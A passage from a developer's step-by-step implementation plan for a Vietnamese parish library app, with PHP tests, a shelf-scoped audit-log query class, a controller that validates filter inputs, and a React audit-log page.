        collect($q->run(page: 2)['rows'])->pluck('id')->all(),
    );

    // 4 fixture rows + 30 = 34: page 1 returns 25, page 2 returns 9.
    expect($seen)->toHaveCount(34)
        ->and(array_unique($seen))->toHaveCount(34);
});

it('never shows another shelf\'s rows, and never a global null-shelf row', function () {
    alogFix();

    $rows = app(AuditLogQuery::class)->run();

    expect($rows['total'])->toBe(4);
    foreach ($rows['rows'] as $row) {
        expect($row['sentence'])->not->toContain('Tủ Khác')
            ->and($row['sentence'])->not->toContain('Toàn Cục')
            ->and($row['action'])->not->toBe('bookshelf.created');
    }
});

it('renders each entry as its Vietnamese sentence with names resolved from stored ids', function () {
    $f = alogFix();

    $bySentence = collect(app(AuditLogQuery::class)->run()['rows'])->pluck('sentence', 'action');

    // Subject via after.borrower_id (a loan's entity is the loan; the
    // person is inside the payload):
    expect($bySentence['loan.created'])
        ->toBe('Maria Quản Lý Nhật Ký đã cho Giuse Bé Đọc Sách mượn Dế Mèn Phiêu Lưu Ký')
        // Subject via the membership entity join:
        ->and($bySentence['membership.approved'])
        ->toBe('Maria Quản Lý Nhật Ký đã duyệt tài khoản của Giuse Bé Đọc Sách')
        // Subject via the user entity join, with NO payload at all:
        ->and($bySentence['credentials.set'])
        ->toBe('Maria Quản Lý Nhật Ký đã đặt hoặc đổi tài khoản đăng nhập cho Giuse Bé Đọc Sách');
});

it('keeps naming a soft-deleted person — the log never rewrites itself', function () {
    $f = alogFix();
    $f['child']->delete();   // SoftDeletes

    $rows = collect(app(AuditLogQuery::class)->run()['rows'])->pluck('sentence', 'action');

    expect($rows['credentials.set'])->toContain('Giuse Bé Đọc Sách');
});

it('the actor filter narrows what is visible and never widens it', function () {
    $f = alogFix();

    // A well-formed uuid naming the OTHER shelf's actor: an empty page,
    // never Vĩnh Long's history (the reference's exact property).
    expect(app(AuditLogQuery::class)->run(actorId: $f['foreignActor']->id)['total'])->toBe(0)
        ->and(app(AuditLogQuery::class)->run(actorId: $f['maria']->id)['total'])->toBe(4);
});

it('the group filter partitions by family, from the one map that owns it', function () {
    alogFix();

    $q = app(AuditLogQuery::class);
    expect(collect($q->run(group: 'loans')['rows'])->pluck('action')->all())->toBe(['loan.created'])
        ->and($q->run(group: 'books')['total'])->toBe(1)      // copy.added
        ->and($q->run(group: 'readers')['total'])->toBe(2);   // membership.approved + credentials.set
});

it('date bounds are civil days in Asia/Ho_Chi_Minh, inclusive — the seven-hour trap, pinned', function () {
    $f = alogFix();
    // 2026-08-10 17:30 UTC is ALREADY 2026-08-11 00:30 in Hồ Chí Minh City.
    $lateUtc = AuditLog::query()->create([
        'bookshelf_id' => $f['shelf']->id, 'actor_id' => $f['maria']->id,
        'action' => 'copy.retired', 'entity_type' => 'copy', 'entity_id' => null,
        'before' => null, 'after' => ['reason' => 'rách nát'], 'context' => [],
        'occurred_at' => '2026-08-10 17:30:00',
    ]);

    $aug10 = app(AuditLogQuery::class)->run(from: '2026-08-10', to: '2026-08-10');
    $aug11 = app(AuditLogQuery::class)->run(from: '2026-08-11', to: '2026-08-11');

    // The two 08-10 10:00-UTC rows are 17:00 VN on the 10th; the 17:30
    // UTC row belongs to the 11th alongside membership.approved (09:00
    // UTC on the 11th = 16:00 VN).
    expect(collect($aug10['rows'])->pluck('id'))->not->toContain((string) $lateUtc->id)
        ->and($aug10['total'])->toBe(2)
        ->and(collect($aug11['rows'])->pluck('id'))->toContain((string) $lateUtc->id)
        ->and($aug11['total'])->toBe(2);
});

it('pages at 25 with a total the empty page still carries', function () {
    $f = alogFix();
    foreach (range(1, 26) as $i) {
        AuditLog::query()->create([
            'bookshelf_id' => $f['shelf']->id, 'actor_id' => $f['maria']->id,
            'action' => 'copy.added', 'entity_type' => 'copy', 'entity_id' => null,
            'before' => null, 'after' => ['code' => sprintf('DT-9%03d', $i)], 'context' => [],
            'occurred_at' => '2026-08-12 08:00:00',
        ]);
    }

    $p1 = app(AuditLogQuery::class)->run();
    $p2 = app(AuditLogQuery::class)->run(page: 2);
    $p9 = app(AuditLogQuery::class)->run(page: 9);

    expect($p1['rows'])->toHaveCount(25)->and($p1['total'])->toBe(30)
        ->and($p1['pageCount'])->toBe(2)
        ->and($p2['rows'])->toHaveCount(5)
        // Unlike the reference (its recorded pager-stranding defect), an
        // empty page still knows the total, so the pager can render.
        ->and($p9['rows'])->toBe([])->and($p9['total'])->toBe(30);
});

it('a hostile after.borrower_id resolves to no subject, and renders', function () {
    $f = alogFix();
    // Whatever a build once serialised: Vietnamese text and an emoji where
    // a uuid belongs. What this pins is the OUTCOME — no subject, the bare
    // sentence, a rendered page. It does NOT pin the CONVERT guard: measured
    // on MariaDB 10.11.19, the raw JSON comparison does not raise 1267
    // either (divergence 5's table), so this test is green with the guard
    // removed. The guard is defence in depth; the bind guards in Task 4 are
    // the ones the 1267 class actually needs.
    AuditLog::query()->create([
        'bookshelf_id' => $f['shelf']->id, 'actor_id' => $f['maria']->id,
        'action' => 'loan.created', 'entity_type' => 'loan', 'entity_id' => null,
        'before' => null,
        'after' => ['title' => 'Sách Lạ', 'borrower_id' => 'Giáo họ Đức Mẹ 📚'],
        'context' => [], 'occurred_at' => '2026-08-13 08:00:00',
    ]);

    $rows = app(AuditLogQuery::class)->run();

    expect($rows['total'])->toBe(5)
        ->and(collect($rows['rows'])->first(fn ($r) => str_starts_with($r['occurredAt'], '2026-08-13'))['sentence'])
        ->toBe('Maria Quản Lý Nhật Ký đã cho mượn Sách Lạ');   // subject null → bare form
});

it('an action this build has no sentence for renders the fallback, raw name only in the row data', function () {
    $f = alogFix();
    AuditLog::query()->create([
        'bookshelf_id' => $f['shelf']->id, 'actor_id' => $f['maria']->id,
        'action' => 'parish_unit.created', 'entity_type' => 'parish_unit', 'entity_id' => null,
        'before' => null, 'after' => ['name' => 'Tổ 1'], 'context' => [],
        'occurred_at' => '2026-08-14 08:00:00',
    ]);

    $row = app(AuditLogQuery::class)->run()['rows'][0];

    expect($row['sentence'])->toBe('Maria Quản Lý Nhật Ký đã thực hiện một thao tác hệ thống chưa được mô tả')
        ->and($row['sentence'])->not->toContain('parish_unit.created')
        ->and($row['action'])->toBe('parish_unit.created')   // the expansion's copy
        ->and($row['group'])->toBeNull();
});

it('the expansion carries the stored values, em-dashed where never recorded', function () {
    $f = alogFix();

    $row = collect(app(AuditLogQuery::class)->run()['rows'])
        ->firstWhere('action', 'credentials.set');

    // No payload at all, by design: nothing to expand is the correct answer.
    expect($row['expansion'])->toBe([]);

    $loan = collect(app(AuditLogQuery::class)->run()['rows'])->firstWhere('action', 'loan.created');
    $fields = array_column($loan['expansion'], 'field');
    expect($fields)->toBe(['borrower_id', 'title'])
        ->and($loan['expansion'][1])->toBe(['field' => 'title', 'before' => '—', 'after' => '"Dế Mèn Phiêu Lưu Ký"']);
});

it('lists actors most-active first, for the filter control', function () {
    $f = alogFix();

    // A SECOND actor on this shelf, with fewer entries and a name that
    // sorts BEFORE Maria's in every collation — so "most active first" is
    // falsifiable. With one actor the ordering claim asserts nothing.
    app(TenantContext::class)->actSystemWide();
    $anh = User::factory()->create(['full_name' => 'Anna Ít Việc']);
    AuditLog::query()->create([
        'bookshelf_id' => $f['shelf']->id, 'actor_id' => $anh->id,
        'action' => 'copy.found', 'entity_type' => 'copy', 'entity_id' => null,
        'before' => null, 'after' => null, 'context' => [],
        'occurred_at' => '2026-08-12 01:00:00',
    ]);
    app(TenantContext::class)->set($f['shelf'], $f['mariaMembership']);

    $actors = app(AuditLogQuery::class)->actors();

    expect($actors)->toBe([
        ['userId' => $f['maria']->id, 'name' => 'Maria Quản Lý Nhật Ký', 'entries' => 4],
        ['userId' => $anh->id, 'name' => 'Anna Ít Việc', 'entries' => 1],
    ]);
});
```

- [ ] **Step 3: Run to verify failure** — `make test FILTER=AuditLogQueryTest` → FAIL, class not found.

- [ ] **Step 4: Implement `AuditLogQuery`**

`app/Queries/AuditLogQuery.php`:

```php
<?php

namespace App\Queries;

use App\Models\AuditLog;
use App\Support\Audit\AuditSentences;
use App\Support\TenantContext;
use Carbon\CarbonImmutable;
use Collator;
use Illuminate\Database\Eloquent\Builder;
use Illuminate\Support\Facades\DB;
use RuntimeException;

/**
 * OPS §3.3's GetAuditLog (shelf-scoped) — port of get-audit-log.ts.
 *
 * THE one hand-written bookshelf_id filter outside BookshelfScope, and
 * TenancyArchitectureTest names this file for it: AuditLog is exempt from
 * BelongsToBookshelf (nullable bookshelf_id — global rows are Phase 3's
 * cross-shelf browser), so scoping is this class's own where, and the
 * two-shelf-plus-global-row test in AuditLogQueryTest is what stands
 * behind it. A null bound tenant is an error, not an unscoped read.
 *
 * The order is occurred_at desc, id desc, and the second key is load
 * bearing: AddCopies writes one row per copy at one clock instant, so
 * ties are the ordinary case, and limit/offset over a non-total order
 * repeats and skips rows across pages (measured three times in the
 * reference project). audit_log.id is BIGINT AUTO_INCREMENT — it cannot
 * tie, and it descends with the timestamp.
 *
 * users joins carry NO deleted_at filter, unlike every list query in
 * this repo, deliberately: a soft-deleted person's name vanishing from
 * the trail would be the log quietly rewriting itself (INV-12's spirit).
 *
 * Sentences render STORED values only — the title comes from the
 * payload the command froze at write time, never from books.title, so a
 * later UpdateBook cannot restate history. People are the exception by
 * design: an id is a reference, and resolving it to today's name is
 * what lets "who has been touching whose account" be answered at all.
 */
final class AuditLogQuery
{
    private const int PAGE_SIZE = 25;

    private const string TIMEZONE = 'Asia/Ho_Chi_Minh';

    public function __construct(private TenantContext $context) {}

    /**
     * Inputs are the CONTROLLER's to validate (uuid-shaped actor, known
     * group, real Y-m-d civil dates): this class trusts their shape and
     * only decides what they mean.
     *
     * @return array{rows: list<array<string, mixed>>, page: int, pageCount: int, total: int}
     */
    public function run(?string $actorId = null, ?string $group = null, ?string $from = null, ?string $to = null, int $page = 1): array
    {
        $page = max(1, $page);

        $filtered = $this->scoped();
        if ($actorId !== null) {
            $filtered->where('audit_log.actor_id', $actorId);
        }
        if ($group !== null) {
            // The group becomes the list of actions the one map owns — never
            // a like 'loan.%' pattern, which would be a second, weaker copy
            // of the partition (loan.* and request.* are one family to a
            // volunteer, which no prefix can express).
            $filtered->whereIn('audit_log.action', AuditSentences::actionsInGroup($group));
        }
        if ($from !== null) {
            // The instant the civil day BEGINS in the shelf's timezone,
            // compared in UTC — a bare date comparison files everything
            // after 5pm local under the wrong day (the reference measured
            // exactly seven hours, twice).
            $filtered->where('audit_log.occurred_at', '>=',
                CarbonImmutable::parse($from, self::TIMEZONE)->startOfDay()->utc());
        }
        if ($to !== null) {
            // +1 day with a strict < makes the range inclusive of the whole
            // of the last civil day.
            $filtered->where('audit_log.occurred_at', '<',
                CarbonImmutable::parse($to, self::TIMEZONE)->addDay()->startOfDay()->utc());
        }

        $total = (clone $filtered)->count();

        $rows = $filtered
            ->leftJoin('users as actor_user', 'actor_user.id', '=', 'audit_log.actor_id')
            // The subject, resolved from an id the ROW holds, in order of
            // preference: entity_id first (the thing the entry is about),
            // the payload's borrower second (a loan's entity is the loan;
            // the person is inside it). Nothing else is consulted.
            ->leftJoin('users as subject_user', function ($join) {
                $join->on('subject_user.id', '=', 'audit_log.entity_id')
                    ->where('audit_log.entity_type', '=', 'user');
            })
            ->leftJoin('memberships as subject_membership', function ($join) {
                $join->on('subject_membership.id', '=', 'audit_log.entity_id')
                    ->where('audit_log.entity_type', '=', 'membership');
            })
            ->leftJoin('users as member_user', 'member_user.id', '=', 'subject_membership.user_id')
            // A uuid stored inside a JSON payload, written by whatever build
            // was deployed. JSON_UNQUOTE yields utf8mb4; users.id is
            // ascii_bin; comparing them raw is errno 1267 — this repo's
            // six-times-paid live 500. CONVERT ... USING ascii degrades any
            // non-ASCII byte to '?', which matches nothing, and the COLLATE
            // pins the comparison to the column's own collation.
            ->leftJoin('users as payload_user', function ($join) {
                $join->on('payload_user.id', '=', DB::raw(
                    "CONVERT(JSON_UNQUOTE(JSON_EXTRACT(audit_log.after, '$.borrower_id')) USING ascii) COLLATE ascii_bin"
                ));
            })
            ->select('audit_log.*')
            ->selectRaw('actor_user.full_name as actor_name')
            ->selectRaw('coalesce(subject_user.full_name, member_user.full_name, payload_user.full_name) as subject_name')
            ->orderByDesc('audit_log.occurred_at')
            ->orderByDesc('audit_log.id')
            ->limit(self::PAGE_SIZE)
            ->offset(($page - 1) * self::PAGE_SIZE)
            ->get();

        return [
            'rows' => array_values($rows->map(function (AuditLog $row): array {
                $facts = [
                    'actor' => $row->getAttribute('actor_name'),
                    'subject' => $row->getAttribute('subject_name'),
                    'before' => $row->before,
                    'after' => $row->after,
                ];

                return [
                    'id' => (string) $row->id,
                    'action' => $row->action,
                    'entityType' => $row->entity_type,
                    'entityId' => $row->entity_id,
                    'occurredAt' => $row->occurred_at->utc()->toIso8601String(),
                    'group' => AuditSentences::groupOf($row->action),
                    'sentence' => AuditSentences::sentence($row->action, $facts),
                    'expansion' => AuditSentences::payloadRows($row->before, $row->after),
                ];
            })->all()),
            'page' => $page,
            'pageCount' => max(1, (int) ceil($total / self::PAGE_SIZE)),
            'total' => $total,
        ];
    }

    /** @return list<array{userId: string, name: string, entries: int}> */
    public function actors(): array
    {
        $rows = $this->scoped()
            ->whereNotNull('audit_log.actor_id')
            ->join('users', 'users.id', '=', 'audit_log.actor_id')
            ->groupBy('users.id', 'users.full_name')
            ->selectRaw('users.id as user_id, users.full_name as name, count(*) as entries')
            ->get();

        // Count desc, then Vietnamese collation on the name (Đặng before
        // Vũ — byte order would file every Đ after z), then id as the
        // stable tiebreak so a <select>'s options never move between
        // renders. In PHP with Collator, the ParishUnits precedent.
        $collator = new Collator('vi');
        $options = $rows->map(fn ($r) => [
            'userId' => (string) $r->getAttribute('user_id'),
            'name' => (string) $r->getAttribute('name'),
            'entries' => (int) $r->getAttribute('entries'),
        ])->all();
        usort($options, fn (array $a, array $b) => ($b['entries'] <=> $a['entries'])
            ?: ($collator->compare($a['name'], $b['name']) ?: 0)
            ?: ($a['userId'] <=> $b['userId']));

        return array_values($options);
    }

    /** @return Builder<AuditLog> */
    private function scoped(): Builder
    {
        $bookshelfId = $this->context->bookshelfId();

        if ($bookshelfId === null) {
            throw new RuntimeException(
                'AuditLogQuery needs a bound tenant — a null bound would read every shelf\'s history.'
            );
        }

        // The exempted hand-written filter TenancyArchitectureTest names
        // this file for. Global (null) rows are EXCLUDED by this equality
        // on purpose: they are Phase 3's cross-shelf browser's.
        return AuditLog::query()->where('audit_log.bookshelf_id', $bookshelfId);
    }
}
```

- [ ] **Step 5: Run** — `make test FILTER=AuditLogQueryTest` → PASS, then `make test FILTER=TenancyArchitectureTest` → PASS (the grep now finds the file and skips it by name).

- [ ] **Step 6: Lint, analyse, commit** — `make lint && make analyse`, commit as `feat: shelf-scoped audit log query — sentences, filters, total order`.

---

### Task 4: The audit screen — `/manage/audit`

Read first: `old_next/src/app/tu-sach/[shelf]/quan-ly/nhat-ky/page.tsx` (the filter controls, the `<details>` expansion, the "nothing renders an action name" rule) and `old_next/src/lib/audit-log.ts` (`AUDIT_GROUP_STYLE` — group icon + ink, colour never the only carrier).

**Files:**
- Create: `app/Http/Controllers/Manage/AuditLogController.php`
- Create: `resources/js/pages/manage/audit.tsx`
- Modify: `routes/web.php` (the `/audit` under-construction line)
- Modify: `resources/js/lib/dates.ts` (+ `formatInstantParts`)
- Modify: `resources/js/lib/copy.ts` (+ `manage.audit` namespace, + `manage.auditNav`)
- Modify: `resources/js/layouts/manage-layout.tsx` (+ Nhật ký nav entry)
- Test: `tests/Feature/Oversight/AuditScreenTest.php`

**Interfaces:**
- Consumes: `AuditLogQuery::{run, actors}` (Task 3), `AuditSentences::GROUPS` (Task 1), `App\Support\QueryParam::first`, `App\Support\SafeId::isUuid`.
- Produces: route `shelves.manage.audit` (GET, `['auth','role:manager']`), Inertia page `manage/audit` with props `filters: {actor: ?string, group: ?string, from: ?string, to: ?string}`, `actors`, `log` (the `run()` shape). Task 9 adds the export panel to this same page.

- [ ] **Step 1: Write the failing feature tests**

`tests/Feature/Oversight/AuditScreenTest.php`:

```php
<?php

use App\Models\AuditLog;
use App\Models\Bookshelf;
use App\Models\Membership;
use App\Models\User;
use App\Support\TenantContext;
use Inertia\Testing\AssertableInertia as Assert;

/** Grep first: `grep -rn "^function ascrFix" tests/`. */
function ascrFix(): array
{
    app(TenantContext::class)->actSystemWide();

    $shelf = Bookshelf::factory()->create(['slug' => 'dong-thap-ascr', 'settings' => []]);
    $manager = User::factory()->create(['full_name' => 'Maria Xem Nhật Ký']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $manager->id, 'role' => 'manager', 'status' => 'active',
    ]);
    $reader = User::factory()->create(['full_name' => 'Anna Chỉ Đọc']);
    Membership::factory()->for($shelf)->create([
        'user_id' => $reader->id, 'role' => 'reader', 'status' => 'active',
    ]);

    AuditLog::query()->create([
        'bookshelf_id' => $shelf->id, 'actor_id' => $manager->id,
        'action' => 'copy.lost_reported', 'entity_type' => 'copy', 'entity_id' => null,
        'before' => ['state' => 'on_loan'], 'after' => ['state' => 'lost', 'note' => null],
        'context' => [], 'occurred_at' => '2026-08-20 03:15:00',
    ]);

    return compact('shelf', 'manager', 'reader');
}

it('renders the log for a manager, sentence and expansion in the props', function () {
    $f = ascrFix();

    $this->actingAs($f['manager'])
        ->get("/shelves/{$f['shelf']->slug}/manage/audit")
        ->assertOk()
        ->assertInertia(fn (Assert $page) => $page
            ->component('manage/audit')
            ->where('log.total', 1)
            ->where('log.rows.0.sentence', 'Maria Xem Nhật Ký đã báo mất một bản sách')
            ->where('log.rows.0.group', 'books')
            ->where('log.rows.0.action', 'copy.lost_reported')
            ->where('log.rows.0.expansion.0.field', 'note')
            ->where('log.rows.0.expansion.0.before', '—')
            ->where('log.rows.0.expansion.0.after', 'null')
            ->where('actors.0.name', 'Maria Xem Nhật Ký')
            ->where('filters.actor', null));
});

it('404s a reader — the interface hiding a page is never the security control', function () {
    $f = ascrFix();

    $this->actingAs($f['reader'])
        ->get("/shelves/{$f['shelf']->slug}/manage/audit")
        ->assertNotFound();
});

it('redirects a guest to login', function () {
    $f = ascrFix();

    $this->get("/shelves/{$f['shelf']->slug}/manage/audit")->assertRedirect();
});

it('survives hostile filter values with 200 and an ignored filter, never a 500', function () {
    $f = ascrFix();

    // ?actor= carrying Vietnamese text or an emoji is the exact shape that
    // has produced a live 1267-collation 500 six times in this repo; the
    // controller must refuse it BEFORE any ascii_bin bind. Arrays too —
    // QueryParam's repeated-key lesson.
    foreach (['actor=Giáo họ Đức Mẹ', 'actor=📚', 'actor[]=a&actor[]=b',
        'group=constructor', 'from=2026-02-31', 'to=không-phải-ngày', 'page=-3'] as $qs) {
        $this->actingAs($f['manager'])
            ->get("/shelves/{$f['shelf']->slug}/manage/audit?{$qs}")
            ->assertOk();
    }
});

it('accepts a well-formed actor filter only when that person has entries here', function () {
    $f = ascrFix();
    $stranger = User::factory()->create(['full_name' => 'Người Lạ Hoàn Toàn']);

    $this->actingAs($f['manager'])
        ->get("/shelves/{$f['shelf']->slug}/manage/audit?actor={$stranger->id}")
        ->assertOk()
        ->assertInertia(fn (Assert $page) => $page->where('filters.actor', null)->where('log.total', 1));
});
```

- [ ] **Step 2: Run to verify failure** — `make test FILTER=AuditScreenTest` → FAIL (route renders `under-construction`).

- [ ] **Step 3: Implement the controller and route**

`app/Http/Controllers/Manage/AuditLogController.php`:

```php
<?php

namespace App\Http\Controllers\Manage;

use App\Http\Controllers\Controller;
use App\Models\Bookshelf;
use App\Queries\AuditLogQuery;
use App\Support\Audit\AuditSentences;
use App\Support\QueryParam;
use App\Support\SafeId;
use Illuminate\Http\Request;
use Inertia\Inertia;
use Inertia\Response;

class AuditLogController extends Controller
{
    public function index(Request $request, Bookshelf $shelf, AuditLogQuery $audit): Response
    {
        $actors = $audit->actors();

        // Every parameter is a raw query value — FreeTextEncodingGuardTest
        // cannot see these (its recorded third blind spot), so each is
        // guarded HERE before it can reach an ascii_bin bind: uuid shape
        // AND membership of the shelf's own actor list for ?actor=
        // (resolving against people this log actually names keeps the
        // page's links honest — a foreign uuid narrows to nothing anyway,
        // but a filter control must not point at a person with no entries);
        // a closed map for ?group=; a real calendar day for ?from=/?to=.
        $actorParam = QueryParam::first($request, 'actor');
        $actorId = SafeId::isUuid($actorParam)
            && in_array($actorParam, array_column($actors, 'userId'), true)
            ? $actorParam : null;

        $groupParam = QueryParam::first($request, 'group');
        $group = in_array($groupParam, AuditSentences::GROUPS, true) ? $groupParam : null;

        $from = self::dateParam(QueryParam::first($request, 'from'));
        $to = self::dateParam(QueryParam::first($request, 'to'));
        $page = max(1, (int) QueryParam::first($request, 'page', '1'));

        return Inertia::render('manage/audit', [
            'filters' => ['actor' => $actorId, 'group' => $group, 'from' => $from, 'to' => $to],
            'actors' => $actors,
            'log' => $audit->run($actorId, $group, $from, $to, $page),
        ]);
    }

    /** A real calendar day as Y-m-d, or null — 2026-02-31 matches the regex and is still refused. */
    private static function dateParam(?string $raw): ?string
    {
        if ($raw === null || preg_match('/^\d{4}-\d{2}-\d{2}$/', $raw) !== 1) {
            return null;
        }
        [$y, $m, $d] = array_map(intval(...), explode('-', $raw));

        return checkdate($m, $d, $y) ? $raw : null;
    }
}
```

In `routes/web.php`, replace the under-construction line (and add the import):

```php
        Route::get('/audit', [AuditLogController::class, 'index'])->name('audit');
```

- [ ] **Step 4: Add the client pieces**

`resources/js/lib/dates.ts` — append:

```ts
/**
 * An ISO instant as the two Vietnamese numbers an audit sentence ends
 * with — "lúc {time} ngày {date}". Every WORD of the sentence is the
 * server's (lang/vi/audit.php); every NUMBER is Intl's, in the shelf's
 * timezone — the reference's split, kept: a pre-glued server string
 * would hard-code "ngày", and a Date in the domain would put a
 * formatter there.
 */
export function formatInstantParts(iso: string): { time: string; date: string } {
    const instant = new Date(iso);
    return {
        time: new Intl.DateTimeFormat("vi-VN", {
            hour: "2-digit",
            minute: "2-digit",
            timeZone: "Asia/Ho_Chi_Minh",
        }).format(instant),
        date: new Intl.DateTimeFormat("vi-VN", {
            day: "2-digit",
            month: "2-digit",
            year: "numeric",
            timeZone: "Asia/Ho_Chi_Minh",
        }).format(instant),
    };
}
```

`resources/js/lib/copy.ts` — add `audit: "Nhật ký",` to the `manage` block's nav words, and a new namespace:

```ts
    manageAudit: {
        title: "Nhật ký",
        lead: "Mọi thay đổi trong tủ sách, ai làm và lúc nào.",
        when: "lúc {time} ngày {date}",
        groupAll: "Tất cả",
        groups: {
            loans: "Mượn và trả",
            books: "Sách",
            readers: "Bạn đọc",
        },
        actorLabel: "Người thực hiện",
        actorAll: "Mọi người",
        actorEntries: "({count} lượt)",
        fromLabel: "Từ ngày",
        toLabel: "Đến ngày",
        filter: "Lọc",
        empty: "Chưa có hoạt động nào được ghi lại.",
        detail: "Chi tiết",
        rawAction: "Thao tác",
        fieldHeader: "Trường",
        beforeHeader: "Trước",
        afterHeader: "Sau",
        totalEntries: "{count} lượt ghi",
        prevPage: "Trang trước",
        nextPage: "Trang sau",
    },
```

`resources/js/pages/manage/audit.tsx`:

```tsx
import { Head, router, usePage } from "@inertiajs/react";
import { route } from "ziggy-js";
import ManageLayout from "@/layouts/manage-layout";
import { copy, t } from "@/lib/copy";
import { formatInstantParts } from "@/lib/dates";
import type { SharedData } from "@/types";

interface ExpansionRow {
    field: string;
    before: string;
    after: string;
}

interface AuditRow {
    id: string;
    action: string;
    entityType: string;
    entityId: string | null;
    occurredAt: string;
    group: "loans" | "books" | "readers" | null;
    sentence: string;
    expansion: ExpansionRow[];
}

interface PageProps extends SharedData {
    filters: { actor: string | null; group: string | null; from: string | null; to: string | null };
    actors: { userId: string; name: string; entries: number }[];
    log: { rows: AuditRow[]; page: number; pageCount: number; total: number };
}

const GROUP_KEYS = ["loans", "books", "readers"] as const;

export default function ManageAudit() {
    const { shelf, filters, actors, log } = usePage<PageProps>().props;
    if (!shelf) return null;

    const go = (next: Partial<PageProps["filters"] & { page: number }>) =>
        router.get(
            route("shelves.manage.audit", { shelf: shelf.slug }),
            Object.fromEntries(
                Object.entries({ ...filters, page: undefined, ...next }).filter(
                    ([, v]) => v !== null && v !== undefined && v !== "",
                ),
            ),
        );

    return (
        <ManageLayout>
            <Head title={copy.manageAudit.title} />
            <h1 className="text-2xl font-semibold">{copy.manageAudit.title}</h1>
            <p className="mb-4 text-sm text-muted-foreground">{copy.manageAudit.lead}</p>

            <div className="mb-2 flex flex-wrap gap-2">
                <button
                    type="button"
                    onClick={() => go({ group: null })}
                    className={`rounded-full border px-3 py-1 text-sm ${filters.group === null ? "border-foreground font-medium" : ""}`}
                >
                    {copy.manageAudit.groupAll}
                </button>
                {GROUP_KEYS.map((key) => (
                    <button
                        key={key}
                        type="button"
                        onClick={() => go({ group: key })}
                        className={`rounded-full border px-3 py-1 text-sm ${filters.group === key ? "border-foreground font-medium" : ""}`}
                    >
                        {copy.manageAudit.groups[key]}
                    </button>
                ))}
            </div>

            <div className="mb-4 flex flex-wrap items-end gap-3">
                <label className="flex flex-col text-sm">
                    {copy.manageAudit.actorLabel}
                    <select
                        className="mt-1 h-9 rounded-md border border-input bg-background px-2 text-sm"
                        value={filters.actor ?? ""}
                        onChange={(e) => go({ actor: e.target.value || null })}
                    >
                        <option value="">{copy.manageAudit.actorAll}</option>
                        {actors.map((a) => (
                            <option key={a.userId} value={a.userId}>
                                {a.name} {t(copy.manageAudit.actorEntries, { count: a.entries })}
                            </option>
                        ))}
                    </select>
                </label>
                <label className="flex flex-col text-sm">
                    {copy.manageAudit.fromLabel}
                    <input
                        type="date"
                        className="mt-1 h-9 rounded-md border border-input bg-background px-2 text-sm"
                        value={filters.from ?? ""}
                        onChange={(e) => go({ from: e.target.value || null })}
                    />
                </label>
                <label className="flex flex-col text-sm">
                    {copy.manageAudit.toLabel}
                    <input
                        type="date"
                        className="mt-1 h-9 rounded-md border border-input bg-background px-2 text-sm"
                        value={filters.to ?? ""}
                        onChange={(e) => go({ to: e.target.value || null })}
                    />
                </label>
                <span className="pb-2 text-sm text-muted-foreground">
                    {t(copy.manageAudit.totalEntries, { count: log.total })}
                </span>
            </div>

            {log.rows.length === 0 ? (
                <p className="text-sm text-muted-foreground">{copy.manageAudit.empty}</p>
            ) : (
                <ul className="divide-y border-y">
                    {log.rows.map((row) => {
                        const when = formatInstantParts(row.occurredAt);
                        return (
                            <li key={row.id} className="py-3">
                                <p className="text-sm">
                                    {row.sentence}{" "}
                                    <span className="text-muted-foreground">
                                        {t(copy.manageAudit.when, { time: when.time, date: when.date })}
                                    </span>
                                </p>
                                {/* BR §14: raw values behind an expansion, no client JS —
                                    a <details>, like every disclosure in the reference. */}
                                <details className="mt-1">
                                    <summary className="cursor-pointer text-xs text-muted-foreground">
                                        {copy.manageAudit.detail}
                                    </summary>
                                    <div className="mt-2 text-xs">
                                        <p className="mb-1 font-mono text-muted-foreground">
                                            {copy.manageAudit.rawAction}: {row.action}
                                        </p>
                                        {row.expansion.length > 0 && (
                                            <div className="overflow-x-auto">
                                                <table className="min-w-[320px] text-left">
                                                    <thead>
                                                        <tr className="text-muted-foreground">
                                                            <th className="pr-4 font-normal">{copy.manageAudit.fieldHeader}</th>
                                                            <th className="pr-4 font-normal">{copy.manageAudit.beforeHeader}</th>
                                                            <th className="font-normal">{copy.manageAudit.afterHeader}</th>
                                                        </tr>
                                                    </thead>
                                                    <tbody>
                                                        {row.expansion.map((cell) => (
                                                            <tr key={cell.field}>
                                                                <td className="pr-4 font-mono">{cell.field}</td>
                                                                <td className="pr-4 font-mono">{cell.before}</td>
                                                                <td className="font-mono">{cell.after}</td>
                                                            </tr>
                                                        ))}
                                                    </tbody>
                                                </table>
                                            </div>
                                        )}
                                    </div>
                                </details>
                            </li>
                        );
                    })}
                </ul>
            )}

            {log.pageCount > 1 && (
                <div className="mt-4 flex gap-2">
                    {log.page > 1 && (
                        <button type="button" className="text-sm underline" onClick={() => go({ page: log.page - 1 })}>
                            {copy.manageAudit.prevPage}
                        </button>
                    )}
                    {log.page < log.pageCount && (
                        <button type="button" className="text-sm underline" onClick={() => go({ page: log.page + 1 })}>
                            {copy.manageAudit.nextPage}
                        </button>
                    )}
                </div>
            )}
        </ManageLayout>
    );
}
```

In `resources/js/layouts/manage-layout.tsx`, add after the overdue entry:

```tsx
        {
            name: copy.manage.audit,
            href: route("shelves.manage.audit", { shelf: shelf.slug }),
        },
```

and in `copy.ts`'s `manage` block: `audit: "Nhật ký",`.

- [ ] **Step 5: Run** — `make test FILTER=AuditScreenTest` → PASS. Then `bun run build` (the page must compile; a co-located `.test.tsx` would take down every page — known-gaps) and `bun run lint` (Biome — `noJsxLiterals` proves no inline Vietnamese slipped in).

- [ ] **Step 6: Lint, analyse, commit** — `make lint && make analyse`, commit as `feat: audit log screen — sentences, filters, expansion`.

---

### Task 5: `ManagerDashboardQuery` — counts and totals, computed at query time

Read first: `old_next/src/domain/shelf/queries/get-manager-dashboard.ts` **whole** — the two docstrings carry this task's two laws: every count is "the count of a list that exists, counted the way that list is selected" (a badge that disagrees with the queue it links to is worse than no badge), and nothing is a stored counter (BR §8; OPS §3.3: "a counter can drift").

**Files:**
- Create: `app/Queries/ManagerDashboardQuery.php`
- Test: `tests/Feature/Oversight/ManagerDashboardQueryTest.php`

**Interfaces:**
- Consumes: `App\Support\Clock` (`today(): string`), the `BelongsToBookshelf`-scoped models (`Book`, `BookCopy`, `Loan`, `Membership`), enums `LoanStatus`, `MembershipStatus`, `CopyState`.
- Produces (Task 6's controller): `ManagerDashboardQuery::run(): array{counts: array{overdue: int, pendingRegistrations: int}, totals: array{titles: int, copies: int, onLoan: int, readers: int}}`.

- [ ] **Step 1: Write the failing feature tests**

`tests/Feature/Oversight/ManagerDashboardQueryTest.php`:

```php
<?php

use App\Models\Book;
